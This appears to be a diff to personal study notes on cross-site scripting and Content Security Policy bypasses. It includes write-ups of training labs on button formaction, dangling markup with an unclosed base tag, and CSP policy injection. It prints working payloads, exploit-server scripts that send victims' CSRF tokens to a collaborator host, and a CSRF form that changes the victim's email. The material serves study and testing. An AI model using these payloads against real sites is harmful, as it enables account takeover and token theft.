@@ -1,3 +1,25 @@
+# Cross-Site Scripting (XSS) & Content Security Policy (CSP)
+
+**Overview**
+Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious client-side JavaScript into web pages viewed by other users. Because the browser cannot distinguish between legitimate scripts and injected ones, the malicious code executes within the context of the victim's session. Content Security Policy (CSP) acts as a defense-in-depth mechanism to restrict which resources a page is allowed to load, but misconfigurations can often be bypassed.
+
+**Impact**
+XSS completely breaks the trust relationship between the user and the application. A successful exploit allows an attacker to:
+* **Session Hijacking:** Steal session cookies to achieve complete account takeover.
+* **Credential Harvesting:** Inject fake login forms or keyloggers to capture plaintext passwords.
+* **CSRF Protection Bypass:** Execute arbitrary requests (like changing passwords or transferring funds) using the victim's own anti-CSRF tokens.
+* **Total Application Control:** Read, modify, or delete any data the victim has access to.
+
+**What We Cover in This File:**
+* **Types of XSS:** Distinguishing between Reflected, Stored, and DOM-based XSS, along with practical testing methodologies.
+* **Content Security Policy (CSP):** Understanding CSP directives (like `script-src`), bypassing strict policies via Dangling Markup attacks, and utilizing CSP Injection.
+* **DOM-Based XSS:** Identifying and exploiting dangerous client-side sinks like `eval()` and `innerHTML`.
+* **Context-Specific Injection:** Escaping HTML tags, bypassing WAFs with custom attributes/tags (e.g., `<animate>`, `<xss>`), and weaponizing passive tags via `accesskey`.
+* **JavaScript Context Evasion:** Breaking out of variables, using HTML-encoding tricks, escaping backslashes, and injecting into template literals (`` `${...}` ``).
+* **Advanced Exploitation:** Weaponizing the `fetch` API to exfiltrate cookies, capture auto-filled credentials, and dynamically steal CSRF tokens to forge requests.
+
+---
+
 ### Types of XSS
 
 1. **Reflected XSS** – Script is reflected from the HTTP request.
@@ -1067,3 +1089,254 @@ so what this code does
 -then extract the cstf token using html.match and assign it to const token variable
 
 -then use fetch one more time to send a post request to /my-account/change-email endpoint using the csrf token u extracted and the new email u want to assign
+
+# Content Security Policy (CSP)
+
+## What is CSP?
+
+- A browser security mechanism that aims to mitigate XSS and other attacks
+- Restricts the resources (scripts, images) that a page can load
+- To enable it, a response needs to include the HTTP response header `Content-Security-Policy` with a value containing the policy
+
+```
+script-src 'self'
+```
+→ Only allows scripts to be loaded from the same origin as the page itself
+
+```
+script-src https://scripts.normal-website.com
+```
+→ Only allows scripts to load from that specific domain
+
+---
+
+## Lab: Reflected XSS Protected by Very Strict CSP — CSP Bypass Method
+
+### Steps
+
+**1)** First tried to bypass the email field restriction by inspecting and changing the input type from `email` to `text`.
+
+**2)** Was able to inject an `<img>` tag after the email but it got encoded in the source code:
+
+```
+Your email is: test@test.com'"><img src=0 onerror=alert(1)>
+```
+
+In page source it looked like:
+
+```html
+<p>Your email is: <span id="user-email">test@test.com&apos;&quot;&gt;&lt;img src=0 onerror=alert(1)&gt;</span></p>
+```
+
+Since the tags get encoded, this path is useless — need to find another source.
+
+**3)** Tried adding a query URL parameter called `email` directly in the URL:
+
+```
+https://LAB-ID.web-security-academy.net/my-account?id=wiener&email=<"test@test.com">
+```
+
+Found that it gets reflected in the `value` attribute of an `<input>` tag **without encoding** — a useful sink:
+
+```html
+<input required type="email" name="email" value="<"test@test.com'">
+```
+
+**4)** Since it doesn't get encoded, you could try injecting `<script>` tags after breaking out of the input — but CSP blocks this:
+
+```
+default-src 'self';
+script-src 'self';
+```
+
+`<img onerror>` won't fire either for the same reason.
+
+**5)** `<button>` tags are not blocked by CSP. Using them to redirect the victim to the exploit server:
+
+```
+https://LAB-ID.web-security-academy.net/my-account?id=wiener&email=test@mail.com"><button formaction="https://EXPLOIT-SERVER.exploit-server.net/exploit">Click me</button>
+```
+
+> Tried `<a>` tags with a full-page overlay instead but CSP blocks `style-src 'self'`, so inline styles don't work.
+
+**6)** After clicking the button and checking the exploit server access log, the GET request arrives — but without the CSRF token. This is where `formmethod` comes in:
+
+> **`formmethod`** — an attribute added to `<button>` tags that overrides the form's HTTP method.
+
+Since the injection is inside a change-email form, overriding the method to `GET` includes the CSRF token in the URL.
+
+Final payload:
+
+```
+test@mail.com"><button formaction="https://EXPLOIT-SERVER.exploit-server.net/exploit" formmethod="get">Click me</button>
+```
+
+**7)** Checking the exploit server access log after clicking confirms the CSRF token is now in the request:
+
+```
+197.52.12.238  2026-02-18 02:52:50 +0000 "GET /exploit?email=test%40mail.com&csrf=2lvm11izCqwU8ESwengbfqQrArsDaaEN HTTP/1.1" 200
+```
+
+**8)** To confirm this on the victim, send a script from the exploit server that redirects them to the injected URL:
+
+```html
+<script>
+location = `https://LAB-ID.web-security-academy.net/my-account?email=test@mail.com%22%3E%3Cbutton%20formaction=%22https://EXPLOIT-SERVER.exploit-server.net/exploit%22%20formmethod=%22get%22%3EClick%20me%3C/button%3E`;
+</script>
+```
+
+**9)** The victim's CSRF token appears in the access log — but it can't be used directly since the website ties the token to the user session.
+
+Instead, generate a CSRF PoC (e.g. via Burp Suite) using the stolen token:
+
+```html
+<html>
+  <body>
+    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hacker@evil-user.net" />
+      <input type="hidden" name="csrf" value="STOLEN_TOKEN" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+This page forces the victim to submit a change-email request using their own stolen CSRF token.
+
+---
+
+## Lab: Reflected XSS Protected by Very Strict CSP — Dangling Markup Method
+
+### What is Dangling Markup Injection?
+
+A technique used to force a victim's browser to send data from their own page to an attacker-controlled server — by attaching page content to a URL as a query parameter.
+
+**How it works:**
+
+Given a vulnerable input that reflects into:
+
+```html
+<input type="text" name="input" value="CONTROLLABLE DATA HERE">
+```
+
+Instead of normal data, inject an unclosed tag whose `src` points to your server:
+
+```
+"> <img src="https://attacker.website?data=
+```
+
+The browser treats everything after `?data=` — up to the next `"` in the page — as the query parameter value. This leaks sensitive page content (like CSRF tokens) to the attacker without any JavaScript execution.
+
+> The parameter name (`data=`) is fake — it's just used to make the browser attach the rest of the page as a URL value.
+
+---
+
+### Steps
+
+**1)** Used the same `email` URL parameter from the previous lab.
+
+**2)** Injected an unclosed `<img>` tag:
+
+```
+"> <img src="https://attacker.website?data=
+```
+
+This doesn't work — CSP blocks the `src` load attempt entirely. Even `<img src=0 onerror=alert(1)>` won't fire.
+
+**3)** Switched to `<a>` tags — these work without triggering CSP:
+
+```html
+<a href="https://google.com">click me</a>
+```
+
+**4)** To exploit this, the `<base>` tag is needed.
+
+### The `<base>` Tag
+
+- Specifies the base URL for all relative URLs in the document
+- Only one `<base>` element is allowed per document
+- Must have an `href` and/or `target` attribute
+- Must appear before any other elements that reference URLs (e.g. `<link href="...">`)
+- If multiple `<base>` elements exist, only the **first** `href` and `target` are used — the rest are ignored
+
+Reference: https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/base
+
+**5)** The injection combines `<a>` with an unclosed `<base target="` to abuse the `target` attribute:
+
+```
+https://LAB-ID.web-security-academy.net/my-account?email="><a href="https://EXPLOIT-SERVER.exploit-server.net/exploit">Click me</a><base target="
+```
+
+The `<base target="` is left unclosed. The browser reads everything that follows — including the CSRF token in the page's form — as the value of the `target` attribute. When the victim clicks the link, the exploit page opens and `window.name` contains that captured data.
+
+**6)** Exploit server script:
+
+```html
+<script>
+if (window.name) {
+    new Image().src = '//BURP-COLLABORATOR-SUBDOMAIN?' + encodeURIComponent(window.name);
+} else {
+    location = 'https://LAB-ID.web-security-academy.net/my-account?email="><a href="https://EXPLOIT-SERVER.exploit-server.net/exploit">Click me</a><base target="';
+}
+</script>
+```
+
+Once the victim's CSRF token is captured, use the same PoC form from the previous method to change their email.
+
+> ⚠️ **Note:** This lab may not work in newer versions of Chrome due to browser updates that block cross-origin `window.name` abuse. See z3nsh3ll for a reference walkthrough.
+
+---
+
+## Bypassing CSP with Policy Injection
+
+Directives like `report-uri` can accept user-controlled input. If that input is reflected directly into the `Content-Security-Policy` header, you can inject additional CSP directives — this is called **CSP injection**.
+
+> CSP doesn't only block things — it can also be used to *allow* things. For example, `script-src 'unsafe-inline'` tells CSP to permit all inline scripts on the page.
+
+---
+
+## Lab: Reflected XSS Protected by CSP — CSP Bypass via Policy Injection
+
+### Steps
+
+**1)** Sent the home page request through Burp Repeater and found the CSP header:
+
+```
+Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self'; style-src 'self'; report-uri /csp-report?token=
+```
+
+Noticed the `token=` parameter at the end. Tested adding it to the URL:
+
+```
+GET /?search=test&token=test
+```
+
+Response confirmed the value is reflected into the CSP header:
+
+```
+Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self'; style-src 'self'; report-uri /csp-report?token=test
+```
+
+**2)** Since the `token` value lands directly in the CSP header, directives can be injected after it.
+
+**3)** First attempt:
+
+```
+token=test; script-src 'unsafe-inline'
+```
+
+This gets reflected but **doesn't work** — `script-src 'self'` was already declared earlier in the policy and the browser honours the first declaration.
+
+After checking the CSP spec, found that `script-src-elem` is a separate directive that controls inline `<script>` elements specifically — and it **overrides `script-src`** for that context even if `script-src` was set earlier.
+
+**4)** Final payload:
+
+```
+?search=<script>alert(1)</script>&token=test; script-src-elem 'unsafe-inline';
+```
+
+The injected directive allows the inline script, the alert fires, and the lab is solved.
